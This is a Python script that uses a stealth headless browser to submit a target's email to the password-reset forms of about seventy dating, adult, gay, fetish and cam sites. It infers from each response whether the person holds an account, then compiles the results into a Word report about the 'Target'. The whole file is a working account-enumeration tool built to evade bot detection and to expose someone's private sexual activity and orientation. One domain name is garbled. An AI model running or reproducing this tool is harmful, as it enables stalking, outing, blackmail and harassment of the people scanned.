import requests
from bs4 import BeautifulSoup
import re
import time
import asyncio
from typing import List, Dict
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
from docx import Document
from docx.shared import Inches
from docx.enum.text import WD_ALIGN_PARAGRAPH
import os
from datetime import datetime

class ComprehensiveDatingScanner:
    def __init__(self):
        self.results = {}
        self.comprehensive_sites = {

            # ---- Major Dating Sites ----
            'tinder.com': {'path': '/app/login', 'type': 'dating'},
            'bumble.com': {'path': '/login', 'type': 'dating'},
            'okcupid.com': {'path': '/login', 'type': 'dating'},
            'match.com': {'path': '/login', 'type': 'dating'},
            'plentyoffish.com': {'path': '/inbox', 'type': 'dating'},
            'eharmony.com': {'path': '/login', 'type': 'dating'},
            'eliteシングルズ.com': {'path': '/login', 'type': 'dating'},
            'zoosk.com': {'path': '/login', 'type': 'dating'},
            'chemistry.com': {'path': '/login', 'type': 'dating'},
            'silversingles.com': {'path': '/login', 'type': 'dating'},

            # ---- Adult / Sex ----
            'adultfriendfinder.com': {'path': '/login.php', 'type': 'adult'},
            'adultfriendfinder.net': {'path': '/login', 'type': 'adult'},
            'adultfriendfinder.org': {'path': '/login', 'type': 'adult'},
            'ashleymadison.com': {'path': '/login', 'type': 'adult'},
            'fetlife.com': {'path': '/login', 'type': 'fetish'},
            'alt.com': {'path': '/login', 'type': 'bdsm'},
            'bondage.com': {'path': '/login', 'type': 'bdsm'},
            'bdsm.com': {'path': '/login', 'type': 'bdsm'},
            'collarme.com': {'path': '/login', 'type': 'bdsm'},  # fixed whitespace

            # ---- Hookup ----
            'pure.app': {'path': '/login', 'type': 'hookup'},
            'feeld.co': {'path': '/login', 'type': 'hookup'},
            'grindr.com': {'path': '/login', 'type': 'gay'},
            'scruff.com': {'path': '/login', 'type': 'gay'},
            'hornet.com': {'path': '/login', 'type': 'gay'},
            'romeo.com': {'path': '/login', 'type': 'gay'},
            'jackd.com': {'path': '/login', 'type': 'gay'},
            'growlr.com': {'path': '/login', 'type': 'gay'},

            # ---- International ----
            'badoo.com': {'path': '/login', 'type': 'dating'},
            'happn.com': {'path': '/login', 'type': 'dating'},
            'hily.com': {'path': '/login', 'type': 'dating'},
            'innercircle.co': {'path': '/login', 'type': 'dating'},
            'theleague.com': {'path': '/login', 'type': 'dating'},
            'hinge.co': {'path': '/login', 'type': 'dating'},

            # ---- Niche Adult ----
            'passion.com': {'path': '/login', 'type': 'adult'},
            'getiton.com': {'path': '/login', 'type': 'hookup'},
            'ihookup.com': {'path': '/login', 'type': 'hookup'},
            'xmatch.com': {'path': '/login', 'type': 'adult'},
            'together2night.com': {'path': '/login', 'type': 'hookup'},
            'snapmilfs.com': {'path': '/login', 'type': 'adult'},
            'snapfuck.com': {'path': '/login', 'type': 'adult'},
            'affairdating.com': {'path': '/login', 'type': 'adult'},

            # ---- Fetish / BDSM ----
            'kink.com': {'path': '/login', 'type': 'fetish'},
            'recon.com': {'path': '/login', 'type': 'fetish'},
            'fetster.com': {'path': '/login', 'type': 'fetish'},
            'thecage.co': {'path': '/login', 'type': 'fetish'},

            # ---- Swingers ----
            'swinglifestyle.com': {'path': '/login', 'type': 'swinger'},
            'sdcfriends.com': {'path': '/login', 'type': 'swinger'},
            'kasidie.com': {'path': '/login', 'type': 'swinger'},

            # ---- Cam Sites ----
            'cams.com': {'path': '/login', 'type': 'cam'},
            'chaturbate.com': {'path': '/login', 'type': 'cam'},
            'livejasmin.com': {'path': '/login', 'type': 'cam'},
            'stripchat.com': {'path': '/login', 'type': 'cam'},
            'myfreecams.com': {'path': '/login', 'type': 'cam'},
            'bongacams.com': {'path': '/login', 'type': 'cam'},
            'flirt4free.com': {'path': '/login', 'type': 'cam'},
            'imlive.com': {'path': '/login', 'type': 'cam'},
            'streamate.com': {'path': '/login', 'type': 'cam'},

            # ---- Content Subscription ----
            'onlyfans.com': {'path': '/login', 'type': 'content'},
            'fansly.com': {'path': '/login', 'type': 'content'},
            'pocketstars.com': {'path': '/login', 'type': 'content'},
            'loyal.fans': {'path': '/login', 'type': 'content'},
            'justfor.fans': {'path': '/login', 'type': 'content'},
            'erothots.co': {'path': '/login', 'type': 'content'},

            # ---- Extra Dating ----
            'localmilfselfies.com': {'path': '/login', 'type': 'adult'},
            'fdating.com': {'path': '/login', 'type': 'dating'},
            'mingle2.com': {'path': '/login', 'type': 'dating'},
            'speeddate.com': {'path': '/login', 'type': 'dating'},
        }

    def stealth_browser(self):
        options = uc.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--user-agent=Mozilla/5.0')
        driver = uc.Chrome(options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver

    def scan_dating_sites(self, email: str, phone: str) -> List[Dict]:

        results = []
        driver = self.stealth_browser()

        for site, config in self.comprehensive_sites.items():
            try:
                print(f"\n🔍 Scanning {site}...")
                url = f"https://{site}{config['path']}"
                driver.get(url)
                time.sleep(2)

                # ---- detect forgot/reset buttons ----
                forgot_xpaths = [
                    "//*[contains(text(), 'forgot')]",
                    "//a[contains(@href, 'reset')]",
                    "//a[contains(@href, 'recover')]",
                ]

                for xp in forgot_xpaths:
                    try:
                        btn = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.XPATH, xp))
                        )
                        btn.click()
                        time.sleep(1)
                        break
                    except:
                        pass

                # ---- input email ----
                email_xpaths = [
                    "//input[@type='email']",
                    "//input[contains(@name,'email')]",
                    "//input[contains(@placeholder,'email')]",
                ]

                for xp in email_xpaths:
                    try:
                        f = driver.find_element(By.XPATH, xp)
                        f.clear()
                        f.send_keys(email)
                        break
                    except:
                        pass

                # ---- submit ----
                submit_xpaths = [
                    "//button[@type='submit']",
                    "//input[@type='submit']",
                    "//button[contains(text(),'Send')]",
                    "//button[contains(text(),'submit')]"
                ]

                for xp in submit_xpaths:
                    try:
                        btn = driver.find_element(By.XPATH, xp)
                        btn.click()
                        time.sleep(3)
                        break
                    except:
                        pass

                source = driver.page_source.lower()

                positive = [
                    "sent to your email",
                    "check your inbox",
                    "reset link sent",
                    "we found your account"
                ]

                negative = [
                    "no account found",
                    "email not found",
                    "not registered"
                ]

                if any(p in source for p in positive):
                    status = "ACCOUNT_EXISTS"
                elif any(n in source for n in negative):
                    status = "NO_ACCOUNT"
                else:
                    status = "UNKNOWN"

                results.append({
                    'site': site,
                    'type': config['type'],
                    'status': status,
                    'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })

            except Exception as e:
                results.append({
                    'site': site,
                    'type': config['type'],
                    'status': 'SCAN_FAILED',
                    'error': str(e),
                    'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })

            time.sleep(1)

        driver.quit()
        return results

    def generate_doc_report(self, email: str, phone: str, findings: List[Dict]):
        doc = Document()

        doc.add_heading(f'Dating/Sex Site Scan Report', 0)
        doc.add_heading(f'Target: {email}', level=1)
        doc.add_paragraph(f"Scan Time: {datetime.now()}")

        categories = {}
        for f in findings:
            cat = f['type'].upper()
            categories.setdefault(cat, []).append(f)

        for cat, group in categories.items():
            doc.add_heading(cat, level=1)
            table = doc.add_table(rows=1, cols=4)
            hdr = table.rows[0].cells
            hdr[0].text = "Site"
            hdr[1].text = "Status"
            hdr[2].text = "Scan Time"
            hdr[3].text = "Notes"

            for g in group:
                row = table.add_row().cells
                row[0].text = g['site']
                row[1].text = g['status']
                row[2].text = g['scan_time']
                row[3].text = ""

        outname = f"dating_scan_{email.replace('@','_at_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.docx"
        doc.save(outname)
        return outname


def main():
    email = input("Enter email to scan: ")
    phone = input("Enter phone (optional): ")

    scanner = ComprehensiveDatingScanner()

    print("\n🚀 Starting scan across ALL dating/sex sites...\n")
    findings = scanner.scan_dating_sites(email, phone)

    doc_file = scanner.generate_doc_report(email, phone, findings)

    print(f"\n✅ Scan Complete")
    print(f"📄 Report: {doc_file}")
    print(f"🔎 Accounts Detected: {len([f for f in findings if f['status']=='ACCOUNT_EXISTS'])}")


if __name__ == "__main__":
    main()
